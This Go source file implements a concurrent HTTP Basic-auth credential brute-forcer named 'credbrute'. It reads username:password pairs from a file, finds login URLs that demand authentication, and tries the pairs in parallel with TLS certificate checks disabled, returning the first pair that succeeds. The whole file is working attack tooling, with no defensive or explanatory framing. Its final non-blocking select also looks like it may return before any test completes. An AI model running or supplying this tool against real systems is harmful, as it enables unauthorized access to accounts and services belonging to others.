package credbrute

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// OptimizedBruteForce performs concurrent credential testing
func OptimizedBruteForce(ctx context.Context, host string, loginURLs []string, credFile string, timeout time.Duration) string {
	creds, err := loadCredentials(credFile)
	if err != nil || len(creds) == 0 {
		return ""
	}

	// Create optimized HTTP client with connection pooling
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   false, // Enable keep-alive for better performance
			MaxIdleConns:        50,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
		},
	}

	// Test each URL concurrently
	var wg sync.WaitGroup
	resultChan := make(chan string, 1)

	for _, url := range loginURLs {
		wg.Add(1)
		go func(loginURL string) {
			defer wg.Done()

			// Quick auth check first
			if !requiresAuth(ctx, client, loginURL) {
				return
			}

			// Test credentials concurrently
			credChan := make(chan string, 1)
			var credWg sync.WaitGroup

			// Limit concurrent credential tests per URL
			semaphore := make(chan struct{}, 5)

			for _, cred := range creds {
				credWg.Add(1)
				go func(credential string) {
					defer credWg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					if testCredential(ctx, client, loginURL, credential) {
						select {
						case credChan <- credential:
						default:
						}
					}
				}(cred)
			}

			// Wait for first successful credential
			go func() {
				credWg.Wait()
				close(credChan)
			}()

			if foundCred := <-credChan; foundCred != "" {
				select {
				case resultChan <- foundCred:
				default:
				}
			}
		}(url)
	}

	// Wait for first result or completion
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	select {
	case result := <-resultChan:
		return result
	default:
		return ""
	}
}

// loadCredentials loads credentials from file with caching
var credCache = struct {
	creds []string
	file  string
	mutex sync.RWMutex
}{}

func loadCredentials(credFile string) ([]string, error) {
	credCache.mutex.RLock()
	if credCache.file == credFile && len(credCache.creds) > 0 {
		creds := make([]string, len(credCache.creds))
		copy(creds, credCache.creds)
		credCache.mutex.RUnlock()
		return creds, nil
	}
	credCache.mutex.RUnlock()

	file, err := os.Open(credFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var creds []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			creds = append(creds, line)
		}
	}

	// Cache the credentials
	credCache.mutex.Lock()
	credCache.creds = creds
	credCache.file = credFile
	credCache.mutex.Unlock()

	return creds, scanner.Err()
}

// requiresAuth checks if URL requires authentication
func requiresAuth(ctx context.Context, client *http.Client, url string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Check for auth requirements
	auth := resp.Header.Get("WWW-Authenticate")
	return auth != "" || resp.StatusCode == 401 || resp.StatusCode == 403
}

// testCredential tests a single credential
func testCredential(ctx context.Context, client *http.Client, url, credential string) bool {
	parts := strings.SplitN(credential, ":", 2)
	if len(parts) != 2 {
		return false
	}

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return false
	}

	auth := base64.StdEncoding.EncodeToString([]byte(credential))
	req.Header.Set("Authorization", "Basic "+auth)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}
